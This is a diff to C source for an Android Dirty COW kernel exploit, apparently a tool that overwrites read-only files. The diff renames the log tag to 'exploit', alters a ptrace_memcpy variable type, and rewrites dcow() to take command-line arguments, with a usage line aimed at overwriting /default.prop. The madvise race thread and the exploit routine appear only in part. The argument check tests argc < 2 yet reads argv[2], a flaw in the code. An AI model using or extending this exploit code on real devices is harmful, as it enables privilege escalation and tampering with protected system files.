@@ -17,9 +17,9 @@
 
 #ifdef DEBUG
 #include <android/log.h>
-#define LOGV(...) { __android_log_print(ANDROID_LOG_INFO, "dirty-replacer", __VA_ARGS__); printf(__VA_ARGS__); printf("\n"); fflush(stdout); }
+#define LOGV(...) { __android_log_print(ANDROID_LOG_INFO, "exploit", __VA_ARGS__); printf(__VA_ARGS__); printf("\n"); fflush(stdout); }
 #elif PRINT
-#define LOGV(...) { __android_log_print(ANDROID_LOG_INFO, "dirty-replacer", __VA_ARGS__); printf(__VA_ARGS__); printf("\n"); fflush(stdout); }
+#define LOGV(...) { __android_log_print(ANDROID_LOG_INFO, "exploit", __VA_ARGS__); printf(__VA_ARGS__); printf("\n"); fflush(stdout); }
 #else
 #define LOGV(...)
 #endif
@@ -95,7 +95,7 @@ static void *madviseThread(void *arg)
 static int ptrace_memcpy(pid_t pid, void *dest, const void *src, size_t n)
 {
 	const unsigned char *s;
-	unsigned long value;
+	long value;
 	unsigned char *d;
 
 	d = dest;
@@ -226,8 +226,16 @@ static void exploit(struct mem_arg *mem_arg)
 	LOGV("[*] exploited %d %p=%lx", pid, (void*)mem_arg->offset, *(unsigned long*)mem_arg->offset);
 }
 
-int dcow(const char * tofile, const char * fromfile)
+int dcow(int argc, const char * argv[])
 {
+	if (argc < 2) {
+		LOGV("usage %s /data/local/tmp/default.prop /default.prop", argv[0]);
+		return 0;
+	}
+
+	const char * fromfile = argv[1];
+	const char * tofile = argv[2];
+	LOGV("dcow %s %s", fromfile, tofile);
 
 	struct mem_arg mem_arg;
 	struct stat st;
@@ -272,7 +280,7 @@ int dcow(const char * tofile, const char * fromfile)
 	mem_arg.patch_size = size;
 	memset(mem_arg.patch, 0, size);
 
-	mem_arg.fname = tofile;
+	mem_arg.fname = argv[2];
 
 	read(f2, mem_arg.patch, size);
 	close(f2);
